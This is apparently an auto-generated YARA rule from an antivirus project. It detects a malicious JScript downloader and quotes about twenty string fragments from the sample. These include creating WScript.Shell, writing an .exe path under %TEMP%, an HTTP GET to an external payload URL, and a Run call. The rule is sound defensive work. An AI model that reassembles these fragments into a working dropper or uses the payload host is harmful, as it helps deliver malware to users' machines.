rule sig_20160328_72ed17120de8448c3c45457fb9e70f22 {
  meta:
    description = "datamaliciousorder - file 20160328_72ed17120de8448c3c45457fb9e70f22.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "70e2a54d8c9afecbf3d053b334e02a1a29f715bbee942852d84fe152ae40a438"

  strings:
    $s1  = "function Pmdswtfi() {return Zchvokik[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"whNiARCm9Ktmz.exe\";};" fullword ascii
    $s2  = "Dykugxuq[Oallkvfpho](\"GET\", \"http://aicuiibf.com/l30woad\", false);" fullword ascii
    $s3  = "do {WScript[Tdawd](Mxvas() * 11)} while (Dykugxuq[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Zchvokik = function Ckbpkh() {return WScript[Xakrmv](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Edjksqposw(Vfrxczbyhz, Xrumsk){return Vfrxczbyhz - Xrumsk;};" fullword ascii
    $s6  = "function Deltbduo(Luqzy){Zchvokik[\"Run\"](Luqzy, Cnjyxijpqi, Cnjyxijpqi);};" fullword ascii
    $s7  = "function Nqjlwuiu() {return ((Ajnotf == true) && (Ajnotf == Fyzczkqyh)) ? 1 : Cnjyxijpqi;};" fullword ascii
    $s8  = "function Hjqspw(){return Xakrmv;};" fullword ascii
    $s9  = "function Ggsqcj()" fullword ascii
    $s10 = "function Wvyth(){return Ogsrpnas;};" fullword ascii
    $s11 = "var Fyzczkqyh = false;" fullword ascii
    $s12 = "Ajnotf = true; " fullword ascii
    $s13 = " while (Eugyferusg){" fullword ascii
    $s14 = "var Lugwd = new this[\"Date\"]();" fullword ascii
    $s15 = "var Ajnotf = false;" fullword ascii
    $s16 = "function Mxvas(){return 22;};" fullword ascii
    $s17 = "function Ihhigk(Dkkneb) {var Yjzqtgwwhk = (1, 2, 3, 4, 5, Dkkneb); return Yjzqtgwwhk;};" fullword ascii
    $s18 = "Fyzczkqyh = true; " fullword ascii
    $s19 = "var Eiqkulk = false;" fullword ascii
    $s20 = "return Edjksqposw(Zccahpgg, Xntncikew);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}